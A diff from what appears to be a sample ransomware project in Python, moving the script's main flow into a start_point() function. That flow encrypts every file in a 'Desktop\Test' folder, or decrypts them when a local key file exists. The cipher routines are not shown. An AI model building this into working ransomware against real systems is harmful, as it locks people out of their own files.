@@ -116,22 +116,20 @@ def decrypt(target, key_path):
 
 
 
-
-parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
-# parser.add_argument('-k', type=str, help="The location of the decryption key", required=False)
-# parser.add_argument('-d', type=str, help="The directory to encrypt/decrypt the files", default='Desktop/Test')
-args = parser.parse_args()
+def start_point():
+    parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
+    args = parser.parse_args()
 
 
-file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
-if os.path.isfile(file_path):
-    print(f"Decrypting with {file_path}")
-    directory = navigateToDir("Desktop\\Test")
-    target = getFiles(directory)
-    decrypt(target, file_path)
-else:
-    print("Encrypting")
-    generateKey()
-    directory = navigateToDir("Desktop\\Test")
-    target = getFiles(directory)
-    encrypt(target)
+    file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
+    if os.path.isfile(file_path):
+        print(f"Decrypting with {file_path}")
+        directory = navigateToDir("Desktop\\Test")
+        target = getFiles(directory)
+        decrypt(target, file_path)
+    else:
+        print("Encrypting")
+        generateKey()
+        directory = navigateToDir("Desktop\\Test")
+        target = getFiles(directory)
+        encrypt(target)
